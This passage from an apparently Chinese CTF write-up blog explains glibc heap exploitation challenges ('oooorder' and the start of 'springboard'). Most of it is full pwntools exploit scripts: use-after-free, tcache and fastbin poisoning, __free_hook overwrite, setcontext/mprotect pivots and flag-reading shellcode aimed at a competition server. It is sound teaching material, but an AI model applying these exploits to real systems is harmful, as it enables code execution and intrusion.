add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0xf8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> 

show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
main_arena <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'main_arena'</span><span class="token punctuation">,</span> main_arena<span class="token punctuation">)</span>
lbase <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7dcfca0</span> <span class="token operator">-</span> <span class="token number">0x7ffff79e4000</span><span class="token punctuation">)</span>
__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
mprotect <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>
setcontext <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span>

leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">,</span> __free_hook<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'mprotect'</span><span class="token punctuation">,</span> mprotect<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'setcontext'</span><span class="token punctuation">,</span> setcontext<span class="token punctuation">)</span>

<span class="token comment"># 将#1,#4放入fastbin使得#1里由#4的地址，再通过#0来泄露heap地址</span>
dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
r<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
heap_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'heap_addr'</span><span class="token punctuation">,</span> heap_addr<span class="token punctuation">)</span>

dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># unlink</span>
fake_chunk_addr <span class="token operator">=</span> heap_addr<span class="token operator">-</span><span class="token number">0x2d0</span>
fake_chunk <span class="token operator">=</span> <span class="token string">''</span>
fake_chunk <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1d1</span><span class="token punctuation">)</span>
fake_chunk <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_chunk_addr<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk_addr<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span>
fake_chunk <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_chunk_addr<span class="token punctuation">)</span>
fake_chunk <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x1d0</span><span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>
fake_chunk <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x1d0</span><span class="token punctuation">)</span> <span class="token comment"># pre_size</span>


add<span class="token punctuation">(</span><span class="token number">0x1d8</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment">#dbg('b free')</span>
<span class="token comment">#</span>
add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>

<span class="token comment"># unsorted bin attack to __free_hook-16</span>
<span class="token comment"># #0和#6错位了</span>
fake_chunk <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>
fake_chunk <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_arena<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>__free_hook<span class="token operator">-</span><span class="token number">16</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>

<span class="token comment"># fastbin attack</span>
pay <span class="token operator">=</span> <span class="token string">''</span>
pay <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>__free_hook<span class="token operator">-</span><span class="token number">16</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>

<span class="token comment"># modify free_hook</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
sc2_addr <span class="token operator">=</span> __free_hook <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span>
sc1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
xor rdi, rdi
mov rsi, %d
mov edx, 0x1000

mov eax, 0; //SYS_read
syscall

jmp rsi
'''</span> <span class="token operator">%</span> sc2_addr


pay <span class="token operator">=</span> <span class="token string">'aaa'</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>setcontext<span class="token operator">+</span><span class="token number">53</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>__free_hook <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>sc1<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> pay<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span>

frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> __free_hook <span class="token operator">+</span> <span class="token number">8</span> <span class="token comment"># ret</span>
frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> mprotect
frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> sc2_addr
frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>
frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">1</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment">#dbg('b *%s' % hex(setcontext+53))</span>
<span class="token comment">#raw_input()</span>
dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

flag_str <span class="token operator">=</span> <span class="token string">'/flag\x00\x00\x00'</span>
sc2 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
mov rax, %s
push rax
mov rdi, 0
mov rsi, rsp
xor rdx, rdx
mov rax, 257; //openat
syscall

mov rdi, rax
mov rsi, rsp
mov rdx, 1024
mov rax, 0; //read
syscall

mov rdi, 1;
mov rsi, rsp
mov rdx, rax
mov rax, 1; //write
syscall

mov rdi, 0
mov rax, 60
syscall; //exit
'''</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>u64<span class="token punctuation">(</span>flag_str<span class="token punctuation">)</span><span class="token punctuation">)</span>

s<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>sc2<span class="token punctuation">)</span><span class="token punctuation">)</span>


irt<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="oooorder"><a href="#oooorder" class="headerlink" title="oooorder"></a>oooorder</h2><p>edit功能使用realloc，realloc(ptr, 0)相当于free(ptr)</p>
<p>而add功能可以使得size=0</p>
<p>那么就可以uaf了，leak地址后修改tcache_entry为__free_hook<br>然后又是setcontext,mprotect,orw</p>
<p>题目还关闭了fastbin的使用</p>
<p><img src="/images/ff79dc8d/3.png" alt="upload successful"></p>
<p>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> PwnContext <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'info'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#in case that data is an int</span>
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
rs      <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

ctx<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./oooorder'</span>
ctx<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'183.129.189.60'</span><span class="token punctuation">,</span> <span class="token number">10028</span><span class="token punctuation">)</span>
ctx<span class="token punctuation">.</span>remote_libc <span class="token operator">=</span> <span class="token string">'libc-2.27.so'</span>
ctx<span class="token punctuation">.</span>debug_remote_libc <span class="token operator">=</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'How much is the order?'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> size <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        sa<span class="token punctuation">(</span><span class="token string">'Order notes:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Index of order:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> content <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">:</span>
        sa<span class="token punctuation">(</span><span class="token string">'Order notes:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Index of order:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>



<span class="token comment">#rs()</span>
rs<span class="token punctuation">(</span><span class="token string">'remote'</span><span class="token punctuation">)</span>

<span class="token comment"># leak heap</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'aa'</span><span class="token punctuation">)</span> <span class="token comment"># 0</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment"># 1 size=0</span>
edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment"># chunk1被free掉</span>


add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'aa'</span><span class="token punctuation">)</span> <span class="token comment"># 2 chunk1就是chunk2的node节点</span>


show<span class="token punctuation">(</span><span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">'[1]:'</span><span class="token punctuation">)</span>
heap <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x2e0</span>
leak<span class="token punctuation">(</span><span class="token string">'heap'</span><span class="token punctuation">,</span> heap<span class="token punctuation">)</span>

dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># 0 这块刚好是chunk2的node节点</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>

<span class="token comment"># leak libc</span>
<span class="token comment"># 填满tcache</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment"># 3~11</span>

<span class="token comment"># 留一个隔离top</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">+</span>i<span class="token punctuation">)</span>


add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 3  sizeof(node)=0x10  0x10+0x30+0x10*2=0x50+0x10</span>


show<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'[3]:'</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
main_arena <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
__malloc_hook <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token number">0x70</span>
lbase <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
setcontext <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span>
mprotect <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>

leak<span class="token punctuation">(</span><span class="token string">'main_arena'</span><span class="token punctuation">,</span> main_arena<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>

<span class="token comment"># 修改了node2的内容</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x240</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># heap+0x10</span>
buf<span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token string">'\x01'</span> <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x5b</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span>  <span class="token comment"># 大小为0x60的tcache的数量置为1, 并指向__free_hook</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span>


<span class="token comment"># 修改__free_hook为setcontext+53</span>
add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>setcontext<span class="token operator">+</span><span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 4</span>

sc <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
lea rdi,[rsp+0x3f]
mov rsi,0
mov rax,2
syscall; //open
mov rdi,rax
lea rsi,[rsp-0x100]
mov rdx,0x100
xor rax,rax
syscall; //read
mov rdi,1
mov rdx,rax
mov rax,1
syscall; //write
'''</span>


buf <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span>
buf <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap<span class="token punctuation">)</span> <span class="token comment">#rdi</span>
buf <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span> <span class="token comment">#rsi</span>
buf <span class="token operator">=</span> buf<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
buf <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>  <span class="token comment">#rdx</span>
buf <span class="token operator">=</span> buf<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
buf <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x8b0</span><span class="token punctuation">)</span> <span class="token comment">#rsp</span>
buf <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span> <span class="token comment">#ret</span>
buf <span class="token operator">+=</span> p64<span class="token punctuation">(</span>lbase<span class="token operator">+</span><span class="token number">0x0000000000002b1d</span><span class="token punctuation">)</span> <span class="token comment"># jmp rsp</span>
buf <span class="token operator">+=</span> asm<span class="token punctuation">(</span>sc<span class="token punctuation">)</span>
buf <span class="token operator">+=</span> <span class="token string">'./flag\x00'</span>

add<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span> <span class="token comment">#5</span>


<span class="token comment">#dbg('b *%s' % hex(setcontext+53))</span>
<span class="token comment">#raw_input()</span>
dele<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>


irt<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h2><p>格式化字符串，在堆上</p>
<p>格式化字符串先leak出libc和栈的地址</p>
<p>利用栈上的类似a-&gt;b，a在栈上，b也在栈上，这种栈上存了栈的指针，来任意地址写<br>如下图：</p>
<p><img src="/images/ff79dc8d/4.png" alt="upload successful"></p>
<p>先把循环变量改为负数，突破循环次数</p>
<p><code>0x7fffffffdda8</code>的位置是13$，<code>0x7fffffffde78</code>的位置是39$</p>
<p>通过<code>&quot;%&#123;&#125;c%13$hn&quot;</code>把<code>0x7fffffffde78</code>上存的<code>0x7fffffffe1fc</code>改成<code>0x7fffffffe1ff</code>，也就是循环变量的最高字节处</p>
<p>然后通过<code>&quot;%&#123;&#125;c%39$hhn&quot;</code>，修改循环变量的最高字节，只要使得最高位是1，就能成为负数</p>
<p>同样的操作，将<code>0x7fffffffe1ff</code>改成<code>0x7fffffffddd8</code>(19$)<br><img src="/images/ff79dc8d/5.png" alt="upload successful"></p>
<p>这样就形成了13$-&gt;39$-&gt;19$的链</p>
